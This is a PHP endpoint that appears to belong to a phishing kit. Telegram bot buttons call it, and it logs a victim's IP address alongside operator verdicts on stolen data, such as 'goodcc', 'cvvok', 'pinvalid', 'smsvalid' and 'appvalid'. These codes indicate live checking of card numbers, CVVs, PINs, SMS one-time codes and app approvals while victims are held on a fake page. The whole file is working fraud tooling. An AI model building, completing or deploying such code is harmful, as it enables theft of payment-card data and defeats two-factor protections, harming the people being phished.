<?php
// This endpoint is called from Telegram bot buttons — no session available  
// Input validation only

$userIP = isset($_GET['ip']) ? filter_var(trim($_GET['ip']), FILTER_VALIDATE_IP) : false;
$urlParam = isset($_GET['otp']) ? preg_replace('/[^a-z]/', '', $_GET['otp']) : '';

if (!$userIP || empty($urlParam)) {
    http_response_code(400);
    exit();
}

// Whitelist valid OTP values
$allowed_otp = ['ssredi', 'sstrue', 'ssfalse', 'tovapp', 'appvalid', 'appbad', 'badcc', 'goodcc', 'pincc', 'pinvalid', 'pinbad', 'showcode', 'smsvalid', 'smsbad', 'cvvok', 'cvvbad', 'ckkok', 'ckkbad'];
if (!in_array($urlParam, $allowed_otp)) {
    http_response_code(400);
    exit();
}

$noteText = '';

if ($urlParam === 'ssredi') {
    $noteText = $userIP . ',ssredi';
} elseif ($urlParam === 'sstrue') {
    $noteText = $userIP . ',sstrue';
} elseif ($urlParam === 'ssfalse') {
    $noteText = $userIP . ',ssfalse';
} elseif ($urlParam === 'tovapp') {
    $noteText = $userIP . ',tovapp';
} elseif ($urlParam === 'appvalid') {
    $noteText = $userIP . ',appvalid';
} elseif ($urlParam === 'appbad') {
    $noteText = $userIP . ',appbad';
} elseif ($urlParam === 'badcc') {
    $noteText = $userIP . ',badcc';
} elseif ($urlParam === 'goodcc') {
    $noteText = $userIP . ',goodcc';
} elseif ($urlParam === 'pincc') {
    $noteText = $userIP . ',pincc';
} elseif ($urlParam === 'pinvalid') {
    $noteText = $userIP . ',pinvalid';
} elseif ($urlParam === 'pinbad') {
    $noteText = $userIP . ',pinbad';
} elseif ($urlParam === 'showcode') {
    $noteText = $userIP . ',showcode';
} elseif ($urlParam === 'smsvalid') {
    $noteText = $userIP . ',smsvalid';
} elseif ($urlParam === 'smsbad') {
    $noteText = $userIP . ',smsbad';
} elseif ($urlParam === 'cvvok') {
    $noteText = $userIP . ',cvvok';
} elseif ($urlParam === 'cvvbad') {
    $noteText = $userIP . ',cvvbad';
} elseif ($urlParam === 'ckkok') {
    $noteText = $userIP . ',ckkok';
} elseif ($urlParam === 'ckkbad') {
    $noteText = $userIP . ',ckkbad';
}

$ipListFile = './ip_list.txt';

if (!empty($noteText)) {
    $f = file_put_contents($ipListFile, PHP_EOL . $noteText, FILE_APPEND | LOCK_EX);
    echo 'Added to block note: ' . $noteText;
    echo '<script>setTimeout(function(){ window.close(); }, 100);</script>';
} else {
    echo 'Invalid URL parameter';
}
?>